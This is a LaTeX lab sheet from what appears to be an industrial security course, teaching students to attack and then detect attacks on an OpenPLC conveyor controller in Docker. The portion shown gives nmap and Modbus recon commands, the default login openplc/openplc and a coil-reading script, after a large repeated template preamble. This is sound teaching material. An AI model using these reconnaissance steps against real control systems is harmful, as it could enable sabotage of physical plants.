\documentclass[11pt,a4paper]{article}

\def\courseTitle{Industrial Security (Bachelor)}
\def\labNumber{05}
\def\labTitle{Reproducing a Stuxnet-Shape on the Lab Plant}
\def\labSection{05}
\def\labTime{90--120 min}

% =====================================================================
% Shared preamble for lab sheets.
%
% Caller must \documentclass{article} first, then define:
%   \def\courseTitle{...}
%   \def\labNumber{NN}
%   \def\labTitle{...}
%   \def\labTime{e.g. "30--45 min"}
%   \def\labSection{e.g. "02"}
% Then % =====================================================================
% Shared preamble for lab sheets.
%
% Caller must \documentclass{article} first, then define:
%   \def\courseTitle{...}
%   \def\labNumber{NN}
%   \def\labTitle{...}
%   \def\labTime{e.g. "30--45 min"}
%   \def\labSection{e.g. "02"}
% Then % =====================================================================
% Shared preamble for lab sheets.
%
% Caller must \documentclass{article} first, then define:
%   \def\courseTitle{...}
%   \def\labNumber{NN}
%   \def\labTitle{...}
%   \def\labTime{e.g. "30--45 min"}
%   \def\labSection{e.g. "02"}
% Then \input{../../template/lab-preamble.tex}
% =====================================================================

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[english]{babel}
\usepackage[a4paper, margin=2cm]{geometry}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{tikz}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{hyperref}
\usepackage{tcolorbox}
\tcbuselibrary{skins, breakable}
\usepackage{fontawesome5}

\input{../../../template/tikz-styles.tex}

\providecommand{\courseAuthor}{Industrial Security Lecture Series}
\providecommand{\courseInstitute}{Department of Computer Science}
\providecommand{\companyLogo}{logo}

\definecolor{slideAccent}{HTML}{00205B}
\definecolor{slideSecondary}{HTML}{00A0DC}

% --- Corporate branding overrides ------------------------------------
\IfFileExists{../../../branding.tex}{\input{../../../branding.tex}}{}

\colorlet{labAccent}{slideAccent}
\colorlet{labSec}{slideSecondary}
\definecolor{labCheck}{HTML}{2E7D32}
\definecolor{labWarn}{HTML}{B23A48}

\lstset{
  backgroundcolor=\color{black!4},
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  frame=leftline,
  framerule=2pt,
  rulecolor=\color{labAccent},
  numbers=left,
  numberstyle=\tiny\color{black!50},
  showstringspaces=false,
  tabsize=2
}

\setlength{\tabcolsep}{4pt}

% Let TeX add a little extra inter-word stretch as a last resort before
% it reports an Overfull \hbox. Only kicks in on lines that would
% otherwise overflow (long \texttt paths, URLs, CIDRs); never loosens a
% line that already fits. Keeps prose/itemize within the margin.
\setlength{\emergencystretch}{3em}

\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\lhead{\small \courseTitle{} -- Lab \labNumber}
\rhead{\small Maps to Section \labSection}
\cfoot{\thepage}

\newtcolorbox{stepbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!7, colframe=labAccent, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white,
  colbacktitle=labAccent,
  title={\faTools\ Step #1}
}

\newtcolorbox{warnbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labWarn!7, colframe=labWarn, leftrule=4pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labWarn,
  title={\faExclamationTriangle\ Caution}
}

\newtcolorbox{notebox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!4, colframe=labAccent, leftrule=2pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labAccent,
  title={\faInfoCircle\ Note}
}

\newtcolorbox{goalbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faBullseye\ Goal}
}

\newtcolorbox{deliverbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!10, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faClipboardList\ Deliverable}
}

% --- Solution-sheet boxes (used only by lab-solutions.tex) ----------
\newtcolorbox{solutionbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faCheckCircle\ #1}
}

\newtcolorbox{rubricbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!7, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faBalanceScale\ Grading rubric}
}

\titleformat{\section}{\large\bfseries\color{labAccent}}{\thesection}{0.5em}{}

\newcommand{\labheader}{%
  \noindent
  \begin{tikzpicture}
    \fill[labAccent] (0,0) rectangle (\textwidth, -1.6cm);
    \node[anchor=north west, text=white, font=\bfseries\large] at (0.6cm, -0.4cm) {Lab \labNumber{} -- \labTitle};
    \node[anchor=south west, text=white, font=\small] at (0.6cm, -1.3cm) {\courseTitle{} \quad $\bullet$ \quad Maps to Section \labSection{} \quad $\bullet$ \quad \labTime};
    \node[anchor=north east, fill=labSec, text=white, font=\bfseries, inner sep=4pt, rounded corners=2pt]
      at ([xshift=-0.4cm, yshift=-0.4cm]\textwidth,0) {LAB \labNumber};
  \end{tikzpicture}
  \vspace{4mm}
}

% =====================================================================

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[english]{babel}
\usepackage[a4paper, margin=2cm]{geometry}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{tikz}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{hyperref}
\usepackage{tcolorbox}
\tcbuselibrary{skins, breakable}
\usepackage{fontawesome5}

% =====================================================================
% Shared TikZ styles for the Industrial Security lecture series.
% Loaded by every slide deck and exercise sheet that uses TikZ.
% =====================================================================

\usetikzlibrary{
  arrows.meta,
  shapes,
  shapes.geometric,
  shapes.symbols,
  shapes.multipart,
  positioning,
  fit,
  calc,
  backgrounds,
  decorations.pathmorphing,
  decorations.pathreplacing,
  decorations.text,
  patterns,
  matrix,
  shadows
}

% --- colour palette --------------------------------------------------
\definecolor{isOT}{HTML}{1F4E79}     % OT (deep blue)
\definecolor{isIT}{HTML}{6F2DA8}     % IT (purple)
\definecolor{isSafety}{HTML}{C00000} % safety red
\definecolor{isNet}{HTML}{2E7D32}    % network green
\definecolor{isAttack}{HTML}{B23A48} % attack red
\definecolor{isAccent}{HTML}{E08E0B} % amber
\definecolor{isMute}{HTML}{6B6B6B}   % grey
\definecolor{isLight}{HTML}{EDF2F8}  % light background
\definecolor{isPLC}{HTML}{2C5282}
\definecolor{isHMI}{HTML}{2F855A}
\definecolor{isSCADA}{HTML}{6B46C1}

% --- generic node styles --------------------------------------------
\tikzset{
  isnode/.style={
    draw, rounded corners=2pt, minimum height=8mm, minimum width=18mm,
    font=\small, align=center, thick
  },
  isbox/.style={isnode, fill=isLight},
  plc/.style={isnode, fill=isPLC!15, draw=isPLC, thick},
  hmi/.style={isnode, fill=isHMI!15, draw=isHMI, thick},
  scada/.style={isnode, fill=isSCADA!15, draw=isSCADA, thick},
  sensor/.style={isnode, fill=isNet!10, draw=isNet, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  actuator/.style={isnode, fill=isAccent!15, draw=isAccent, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  firewall/.style={isnode, fill=isAttack!15, draw=isAttack, thick},
  server/.style={isnode, fill=isMute!15, draw=isMute!80, thick},
  switch/.style={isnode, fill=isLight, draw=black!60, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  workstation/.style={isnode, fill=white, draw=isOT, thick},
  attacker/.style={isnode, fill=isAttack!20, draw=isAttack, thick, font=\small\bfseries},
  inetnode/.style={draw, ellipse, minimum width=24mm, minimum height=10mm, font=\scriptsize, fill=isLight, thick},
  process/.style={isnode, fill=isOT!15, draw=isOT, thick, minimum width=24mm},
  zone/.style={
    draw, rounded corners=4pt, thick, dashed, inner sep=4mm
  },
  conduit/.style={-{Stealth[length=2.5mm]}, thick, isNet!80!black},
  attack/.style={-{Stealth[length=2.5mm]}, thick, isAttack, dashed},
  flow/.style={-{Stealth[length=2.5mm]}, thick, isOT!70!black},
  netline/.style={thick, black!60},
  axisline/.style={-{Stealth[length=2mm]}, thick, black!70},
  tag/.style={font=\scriptsize\itshape, fill=white, inner sep=1pt},
  level/.style={
    draw, fill=isLight, minimum width=0.85\linewidth, minimum height=8mm,
    font=\small, anchor=west
  },
  brace/.style={decorate, decoration={brace, amplitude=4pt, raise=2pt}},
  legendbox/.style={draw, rounded corners=2pt, fill=isLight, inner sep=2mm, font=\scriptsize, align=left}
}

% --- handy macros ----------------------------------------------------
% \plcicon, \hmiicon etc as simple labelled boxes; useful inline.
\newcommand{\plcicon}[1][PLC]{\tikz[baseline=-0.6ex]{\node[plc, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}
\newcommand{\hmiicon}[1][HMI]{\tikz[baseline=-0.6ex]{\node[hmi, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}
\newcommand{\fwicon}[1][FW]{\tikz[baseline=-0.6ex]{\node[firewall, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}


\providecommand{\courseAuthor}{Industrial Security Lecture Series}
\providecommand{\courseInstitute}{Department of Computer Science}
\providecommand{\companyLogo}{logo}

\definecolor{slideAccent}{HTML}{00205B}
\definecolor{slideSecondary}{HTML}{00A0DC}

% --- Corporate branding overrides ------------------------------------
\IfFileExists{../../../branding.tex}{% =====================================================================
% Corporate / institutional branding -- single file to customise the
% look of the entire course (slides, notes, exercises, labs).
%
% HOW TO REBRAND IN UNDER A MINUTE:
%   1. Replace `branding/logo.pdf` with your own logo
%      (PDF preferred; PNG and JPG also work -- name it `logo.<ext>`).
%   2. (Optional) change the two colours below to your brand palette.
%   3. (Optional) override the author/institute lines below.
%   4. Re-run `make` at the repo root. That's it.
%
% Everything in this file has sensible defaults; you can delete a line
% to fall back to the built-in defaults, or comment it out.
%
% This file is loaded automatically by the slides, exercise, and lab
% preambles -- you never need to \input it manually.
% =====================================================================

% --- Logo --------------------------------------------------------------
% Path is resolved from each leaf-build directory; the default points at
% the shared `branding/` folder at the repo root. If you put your logo
% somewhere else, set the full or relative path here (without extension):
\renewcommand{\companyLogo}{../../../branding/logo}

% --- Author / institute (appears on the title page footer) ------------
\renewcommand{\courseAuthor}{}
\renewcommand{\courseInstitute}{}

% --- Brand colours ----------------------------------------------------
% slideAccent      = primary brand colour (title bands, accent rule)
% slideSecondary   = secondary brand colour (section badge, highlight)
% Both use HTML hex codes. Keep enough contrast against white text.
\definecolor{slideAccent}{HTML}{00205B}      % deep navy
\definecolor{slideSecondary}{HTML}{00A0DC}   % light blue accent
}{}

\colorlet{labAccent}{slideAccent}
\colorlet{labSec}{slideSecondary}
\definecolor{labCheck}{HTML}{2E7D32}
\definecolor{labWarn}{HTML}{B23A48}

\lstset{
  backgroundcolor=\color{black!4},
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  frame=leftline,
  framerule=2pt,
  rulecolor=\color{labAccent},
  numbers=left,
  numberstyle=\tiny\color{black!50},
  showstringspaces=false,
  tabsize=2
}

\setlength{\tabcolsep}{4pt}

% Let TeX add a little extra inter-word stretch as a last resort before
% it reports an Overfull \hbox. Only kicks in on lines that would
% otherwise overflow (long \texttt paths, URLs, CIDRs); never loosens a
% line that already fits. Keeps prose/itemize within the margin.
\setlength{\emergencystretch}{3em}

\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\lhead{\small \courseTitle{} -- Lab \labNumber}
\rhead{\small Maps to Section \labSection}
\cfoot{\thepage}

\newtcolorbox{stepbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!7, colframe=labAccent, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white,
  colbacktitle=labAccent,
  title={\faTools\ Step #1}
}

\newtcolorbox{warnbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labWarn!7, colframe=labWarn, leftrule=4pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labWarn,
  title={\faExclamationTriangle\ Caution}
}

\newtcolorbox{notebox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!4, colframe=labAccent, leftrule=2pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labAccent,
  title={\faInfoCircle\ Note}
}

\newtcolorbox{goalbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faBullseye\ Goal}
}

\newtcolorbox{deliverbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!10, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faClipboardList\ Deliverable}
}

% --- Solution-sheet boxes (used only by lab-solutions.tex) ----------
\newtcolorbox{solutionbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faCheckCircle\ #1}
}

\newtcolorbox{rubricbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!7, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faBalanceScale\ Grading rubric}
}

\titleformat{\section}{\large\bfseries\color{labAccent}}{\thesection}{0.5em}{}

\newcommand{\labheader}{%
  \noindent
  \begin{tikzpicture}
    \fill[labAccent] (0,0) rectangle (\textwidth, -1.6cm);
    \node[anchor=north west, text=white, font=\bfseries\large] at (0.6cm, -0.4cm) {Lab \labNumber{} -- \labTitle};
    \node[anchor=south west, text=white, font=\small] at (0.6cm, -1.3cm) {\courseTitle{} \quad $\bullet$ \quad Maps to Section \labSection{} \quad $\bullet$ \quad \labTime};
    \node[anchor=north east, fill=labSec, text=white, font=\bfseries, inner sep=4pt, rounded corners=2pt]
      at ([xshift=-0.4cm, yshift=-0.4cm]\textwidth,0) {LAB \labNumber};
  \end{tikzpicture}
  \vspace{4mm}
}

% =====================================================================

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[english]{babel}
\usepackage[a4paper, margin=2cm]{geometry}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{tikz}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{hyperref}
\usepackage{tcolorbox}
\tcbuselibrary{skins, breakable}
\usepackage{fontawesome5}

% =====================================================================
% Shared TikZ styles for the Industrial Security lecture series.
% Loaded by every slide deck and exercise sheet that uses TikZ.
% =====================================================================

\usetikzlibrary{
  arrows.meta,
  shapes,
  shapes.geometric,
  shapes.symbols,
  shapes.multipart,
  positioning,
  fit,
  calc,
  backgrounds,
  decorations.pathmorphing,
  decorations.pathreplacing,
  decorations.text,
  patterns,
  matrix,
  shadows
}

% --- colour palette --------------------------------------------------
\definecolor{isOT}{HTML}{1F4E79}     % OT (deep blue)
\definecolor{isIT}{HTML}{6F2DA8}     % IT (purple)
\definecolor{isSafety}{HTML}{C00000} % safety red
\definecolor{isNet}{HTML}{2E7D32}    % network green
\definecolor{isAttack}{HTML}{B23A48} % attack red
\definecolor{isAccent}{HTML}{E08E0B} % amber
\definecolor{isMute}{HTML}{6B6B6B}   % grey
\definecolor{isLight}{HTML}{EDF2F8}  % light background
\definecolor{isPLC}{HTML}{2C5282}
\definecolor{isHMI}{HTML}{2F855A}
\definecolor{isSCADA}{HTML}{6B46C1}

% --- generic node styles --------------------------------------------
\tikzset{
  isnode/.style={
    draw, rounded corners=2pt, minimum height=8mm, minimum width=18mm,
    font=\small, align=center, thick
  },
  isbox/.style={isnode, fill=isLight},
  plc/.style={isnode, fill=isPLC!15, draw=isPLC, thick},
  hmi/.style={isnode, fill=isHMI!15, draw=isHMI, thick},
  scada/.style={isnode, fill=isSCADA!15, draw=isSCADA, thick},
  sensor/.style={isnode, fill=isNet!10, draw=isNet, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  actuator/.style={isnode, fill=isAccent!15, draw=isAccent, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  firewall/.style={isnode, fill=isAttack!15, draw=isAttack, thick},
  server/.style={isnode, fill=isMute!15, draw=isMute!80, thick},
  switch/.style={isnode, fill=isLight, draw=black!60, minimum height=6mm, minimum width=14mm, font=\scriptsize},
  workstation/.style={isnode, fill=white, draw=isOT, thick},
  attacker/.style={isnode, fill=isAttack!20, draw=isAttack, thick, font=\small\bfseries},
  inetnode/.style={draw, ellipse, minimum width=24mm, minimum height=10mm, font=\scriptsize, fill=isLight, thick},
  process/.style={isnode, fill=isOT!15, draw=isOT, thick, minimum width=24mm},
  zone/.style={
    draw, rounded corners=4pt, thick, dashed, inner sep=4mm
  },
  conduit/.style={-{Stealth[length=2.5mm]}, thick, isNet!80!black},
  attack/.style={-{Stealth[length=2.5mm]}, thick, isAttack, dashed},
  flow/.style={-{Stealth[length=2.5mm]}, thick, isOT!70!black},
  netline/.style={thick, black!60},
  axisline/.style={-{Stealth[length=2mm]}, thick, black!70},
  tag/.style={font=\scriptsize\itshape, fill=white, inner sep=1pt},
  level/.style={
    draw, fill=isLight, minimum width=0.85\linewidth, minimum height=8mm,
    font=\small, anchor=west
  },
  brace/.style={decorate, decoration={brace, amplitude=4pt, raise=2pt}},
  legendbox/.style={draw, rounded corners=2pt, fill=isLight, inner sep=2mm, font=\scriptsize, align=left}
}

% --- handy macros ----------------------------------------------------
% \plcicon, \hmiicon etc as simple labelled boxes; useful inline.
\newcommand{\plcicon}[1][PLC]{\tikz[baseline=-0.6ex]{\node[plc, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}
\newcommand{\hmiicon}[1][HMI]{\tikz[baseline=-0.6ex]{\node[hmi, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}
\newcommand{\fwicon}[1][FW]{\tikz[baseline=-0.6ex]{\node[firewall, minimum width=10mm, minimum height=5mm, font=\scriptsize, inner sep=1pt]{#1};}}


\providecommand{\courseAuthor}{Industrial Security Lecture Series}
\providecommand{\courseInstitute}{Department of Computer Science}
\providecommand{\companyLogo}{logo}

\definecolor{slideAccent}{HTML}{00205B}
\definecolor{slideSecondary}{HTML}{00A0DC}

% --- Corporate branding overrides ------------------------------------
\IfFileExists{../../../branding.tex}{% =====================================================================
% Corporate / institutional branding -- single file to customise the
% look of the entire course (slides, notes, exercises, labs).
%
% HOW TO REBRAND IN UNDER A MINUTE:
%   1. Replace `branding/logo.pdf` with your own logo
%      (PDF preferred; PNG and JPG also work -- name it `logo.<ext>`).
%   2. (Optional) change the two colours below to your brand palette.
%   3. (Optional) override the author/institute lines below.
%   4. Re-run `make` at the repo root. That's it.
%
% Everything in this file has sensible defaults; you can delete a line
% to fall back to the built-in defaults, or comment it out.
%
% This file is loaded automatically by the slides, exercise, and lab
% preambles -- you never need to \input it manually.
% =====================================================================

% --- Logo --------------------------------------------------------------
% Path is resolved from each leaf-build directory; the default points at
% the shared `branding/` folder at the repo root. If you put your logo
% somewhere else, set the full or relative path here (without extension):
\renewcommand{\companyLogo}{../../../branding/logo}

% --- Author / institute (appears on the title page footer) ------------
\renewcommand{\courseAuthor}{}
\renewcommand{\courseInstitute}{}

% --- Brand colours ----------------------------------------------------
% slideAccent      = primary brand colour (title bands, accent rule)
% slideSecondary   = secondary brand colour (section badge, highlight)
% Both use HTML hex codes. Keep enough contrast against white text.
\definecolor{slideAccent}{HTML}{00205B}      % deep navy
\definecolor{slideSecondary}{HTML}{00A0DC}   % light blue accent
}{}

\colorlet{labAccent}{slideAccent}
\colorlet{labSec}{slideSecondary}
\definecolor{labCheck}{HTML}{2E7D32}
\definecolor{labWarn}{HTML}{B23A48}

\lstset{
  backgroundcolor=\color{black!4},
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  frame=leftline,
  framerule=2pt,
  rulecolor=\color{labAccent},
  numbers=left,
  numberstyle=\tiny\color{black!50},
  showstringspaces=false,
  tabsize=2
}

\setlength{\tabcolsep}{4pt}

% Let TeX add a little extra inter-word stretch as a last resort before
% it reports an Overfull \hbox. Only kicks in on lines that would
% otherwise overflow (long \texttt paths, URLs, CIDRs); never loosens a
% line that already fits. Keeps prose/itemize within the margin.
\setlength{\emergencystretch}{3em}

\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\lhead{\small \courseTitle{} -- Lab \labNumber}
\rhead{\small Maps to Section \labSection}
\cfoot{\thepage}

\newtcolorbox{stepbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!7, colframe=labAccent, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white,
  colbacktitle=labAccent,
  title={\faTools\ Step #1}
}

\newtcolorbox{warnbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labWarn!7, colframe=labWarn, leftrule=4pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labWarn,
  title={\faExclamationTriangle\ Caution}
}

\newtcolorbox{notebox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labAccent!4, colframe=labAccent, leftrule=2pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labAccent,
  title={\faInfoCircle\ Note}
}

\newtcolorbox{goalbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faBullseye\ Goal}
}

\newtcolorbox{deliverbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!10, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faClipboardList\ Deliverable}
}

% --- Solution-sheet boxes (used only by lab-solutions.tex) ----------
\newtcolorbox{solutionbox}[1]{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labCheck!7, colframe=labCheck, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labCheck,
  title={\faCheckCircle\ #1}
}

\newtcolorbox{rubricbox}{
  enhanced, breakable, arc=2pt, boxrule=0pt,
  colback=labSec!7, colframe=labSec, leftrule=3pt,
  fonttitle=\bfseries\small, coltitle=white, colbacktitle=labSec,
  title={\faBalanceScale\ Grading rubric}
}

\titleformat{\section}{\large\bfseries\color{labAccent}}{\thesection}{0.5em}{}

\newcommand{\labheader}{%
  \noindent
  \begin{tikzpicture}
    \fill[labAccent] (0,0) rectangle (\textwidth, -1.6cm);
    \node[anchor=north west, text=white, font=\bfseries\large] at (0.6cm, -0.4cm) {Lab \labNumber{} -- \labTitle};
    \node[anchor=south west, text=white, font=\small] at (0.6cm, -1.3cm) {\courseTitle{} \quad $\bullet$ \quad Maps to Section \labSection{} \quad $\bullet$ \quad \labTime};
    \node[anchor=north east, fill=labSec, text=white, font=\bfseries, inner sep=4pt, rounded corners=2pt]
      at ([xshift=-0.4cm, yshift=-0.4cm]\textwidth,0) {LAB \labNumber};
  \end{tikzpicture}
  \vspace{4mm}
}


\begin{document}
\labheader

% --------------------------------------------------------------------
\begin{goalbox}
Stand in the attacker's shoes for one afternoon. You will scan the lab
PLC, baseline its ``normal'', record and replay its own traffic, then
write malicious values that drive the process out of its safe band
while the HMI keeps reporting healthy numbers. Finally, you will turn
around and find your own attack in Zeek's logs -- the way a real SOC
analyst would. Every step here mirrors an incident from the
threat-landscape lecture (Stuxnet, Industroyer, TRITON, CyberAv3ngers).
\end{goalbox}

\begin{warnbox}
\textbf{Lab containers only.} The techniques below are deliberately
offensive (unauthenticated Modbus writes, traffic replay, network
scanning). You may execute them \emph{only} against the lab stack on
the private \texttt{172.28.0.0/16} bridge network. Running any of
them against equipment you do not own is, in most jurisdictions, a
criminal offence under computer-misuse law and -- for OT in particular
-- can also kill people. The lab plant cannot. Real plants can.
\end{warnbox}

% --------------------------------------------------------------------
\section*{Background -- what this lab simulates}

The lab stack runs a tiny conveyor controller as a ladder-logic
program (\texttt{conveyor.st}) on the OpenPLC runtime. For IT-minded
readers, the rough analogy is:

\begin{itemize}\setlength{\itemsep}{1pt}
  \item \textbf{The PLC} (OpenPLC at \texttt{172.28.0.10}, port 502)
        is a tiny embedded server. Instead of HTTP it speaks
        \textbf{Modbus TCP} -- an unauthenticated request/response
        protocol from 1979. Think ``HTTP/1.0 with no TLS, no
        cookies, no Host header, and no User-Agent''.
  \item \textbf{Coils} (booleans) and \textbf{holding registers}
        (16-bit words) are the PLC's memory. They are addressable
        over the network the way a Redis key is addressable: anyone
        who can reach port 502 can read \emph{and write} them.
  \item \textbf{The ladder program} is the application logic. It runs
        every 20\,ms in an infinite loop -- read inputs, compute,
        write outputs. Think of it as a single-threaded event loop
        with a guaranteed maximum jitter.
  \item \textbf{The HMI} (Human--Machine Interface) is the operator's
        web dashboard. It pulls live values from the PLC over Modbus.
        For this lab, OpenPLC's built-in \emph{Monitoring} page
        (\url{http://127.0.0.1:8080}) is your HMI.
\end{itemize}

The \emph{Stuxnet shape} we will reproduce, in miniature, has three
moves:
\begin{enumerate}\setlength{\itemsep}{1pt}
  \item \textbf{Learn what normal looks like} (passive recon, then
        polling for a baseline).
  \item \textbf{Replay} a slice of legitimate traffic so the wire
        looks normal while you act.
  \item \textbf{Write to two places at once}: the variable that drives
        the process and the variable the operator sees. The first
        breaks the plant; the second hides it.
\end{enumerate}

Real-world anchor: at Natanz, Stuxnet recorded $\sim$21~seconds of
normal centrifuge telemetry and played it back to the operator's
WinCC HMI while the Fararo Paya / Vacon variable-frequency drives
were being driven outside spec. The operator saw a healthy plant
for the entire attack window (Falliere, Murchu, Chien,
\emph{W32.Stuxnet Dossier} v1.4, Symantec, Feb 2011, p.~36).

% --------------------------------------------------------------------
\section*{Pre-flight}

\begin{stepbox}{0 -- Bring the stack up}
From the repository root:
\begin{lstlisting}[language=bash]
cd bachelor/labs/_stack
docker compose up -d
docker compose ps
\end{lstlisting}
You should see at least \texttt{is-openplc}, \texttt{is-zeek},
\texttt{is-student}, \texttt{is-opcua}, \texttt{is-mqtt} in
state \texttt{Up}. The \texttt{is-openplc-init} container is
expected to be \texttt{Exited (0)} -- that one is a single-shot
bootstrap that uploads \texttt{conveyor.st} and starts the PLC.

Verify the conveyor program is actually running:
\begin{lstlisting}[language=bash]
docker compose exec student curl -s http://172.28.0.10:8080/login \
  -o /dev/null -w "HTTP %{http_code}\n"
\end{lstlisting}
Expected: \texttt{HTTP 200}.
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 1 -- Reconnaissance}

\begin{stepbox}{1.1 -- Nmap the PLC}
Open a shell in the student container and scan the PLC:
\begin{lstlisting}[language=bash]
docker compose exec student bash
# inside the container:
nmap -sV -p 1-10000 172.28.0.10
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
PORT     STATE SERVICE  VERSION
502/tcp  open  modbus
8080/tcp open  http     OpenPLC Web Server
\end{lstlisting}
Two findings worth noting:
\begin{itemize}\setlength{\itemsep}{1pt}
  \item Port 502 is the IANA-registered port for \textbf{Modbus TCP}.
        Seeing it open from a generic scan is the same signal that
        \texttt{port:502} gives on Shodan -- ``probably a PLC''.
  \item Port 8080 is the engineering UI. In a real plant the
        engineering port has a password (sometimes the factory
        default \texttt{1111}; see CyberAv3ngers / Aliquippa
        2023 -- CISA \emph{AA23-335A}, 1~Dec 2023). Try
        \texttt{openplc / openplc} -- that is the upstream default.
\end{itemize}
\end{stepbox}

\begin{stepbox}{1.2 -- Modbus banner fingerprint}
Nmap also ships an NSE script that asks the PLC who it is:
\begin{lstlisting}[language=bash]
nmap -p 502 --script modbus-discover 172.28.0.10
\end{lstlisting}
\textit{Expected output (abridged):}
\begin{lstlisting}
502/tcp open  modbus
| modbus-discover:
|   sid 0x1:
|     Slave ID data: ...OpenPLC...
\end{lstlisting}
\emph{IT analogue:} this is the OT-world equivalent of an HTTP
\texttt{Server:} response header -- a free banner that tells an
attacker exactly which firmware family to load exploits for.
\end{stepbox}

% --------------------------------------------------------------------
\section*{Part 2 -- Baseline ``normal''}

Before any attack, an attacker (and a defender) needs to know what
the system looks like when nothing is wrong. This is the same
reasoning that drives APM baselines in web ops: you can't say
``latency spiked'' until you know what the median latency is.

\begin{stepbox}{2.1 -- Read every register once}
Inside the student container:
\begin{lstlisting}[language=bash]
python3 /labs/scripts/modbus_read.py
\end{lstlisting}
\textit{Expected output:}
\begin{lstlisting}
Registers 0..9: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
\end{lstlisting}
The conveyor ladder does not use holding registers, so they all
read zero. The interesting state lives in \emph{coils} (booleans).
Read coils 0--7 directly:
\begin{lstlisting}[language=bash]
python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
print("coils 0..7  :", c.read_coils(0, count=8, slave=1).bits[:8])
print("discrete 0.7:", c.read_discrete_inputs(0, count=8, slave=1).bits[:8])
c.close()
PY
\end{lstlisting}
